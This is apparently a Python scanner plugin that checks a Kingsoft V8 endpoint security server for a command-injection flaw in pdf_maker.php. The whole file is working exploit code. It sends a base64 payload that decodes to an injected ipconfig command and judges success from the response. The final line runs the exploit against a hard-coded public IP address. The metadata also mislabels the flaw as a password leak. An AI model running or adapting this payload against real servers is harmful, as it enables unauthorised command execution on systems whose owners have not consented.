# coding:utf-8
import socket
import requests
import warnings

warnings.filterwarnings('ignore')
vul_info = {
    "id": "",
    "name": "金山 V8 终端安全系统 pdf_maker.php 命令执行漏洞",
    "detail": "金山 V8 终端安全系统 pdf_maker.php 存在命令执行漏洞，由于没有过滤危险字符，导致构造特殊字符即可进行命令拼接执行任意命令",
    "level": "高危",
    "type": "密码泄露",
    "port": "",
    "solution": "",
    "reference": "",
    "author": "system",
    "expand": "default"
}


def vul_result(code, message):
    return '{"code":"%d","info":"%s"}' % (code, message)


def alive_detect(ip, port, timeout):
    ak = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ak.settimeout(timeout)
    try:
        ak.connect((ip, port))
        ak.close()
        return 'UP'
    except Exception as e:
        return 'DOWN'

def vul_detect(ip, port, timeout=5):
    if alive_detect(ip, int(port), timeout) == 'DOWN':
        return vul_result(2, '目标端口不可达')
    try:
        target_url = 'http://{}:{}/inter/pdf_maker.php'.format(ip, port)
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = "url=IiB8fCBpcGNvbmZpZyB8fA==&fileName=xxx"
        try:
            response = requests.post(url=target_url, headers=headers, data=data, verify=False, timeout=5)
            if "Windows" in response.text and response.status_code == 200:
                return vul_result(1,'存在')
                 #print("目标 {} 存在漏洞 ,执行 ipconfig, 响应为:n{} ".format(target_url, response.text))
            else:
                 return vul_result(0,'不存在')
        except Exception as e:
            return vul_result(2,e)
    except Exception as e:
        print("请求失败")

print(vul_detect("222.170.19.50",6868))




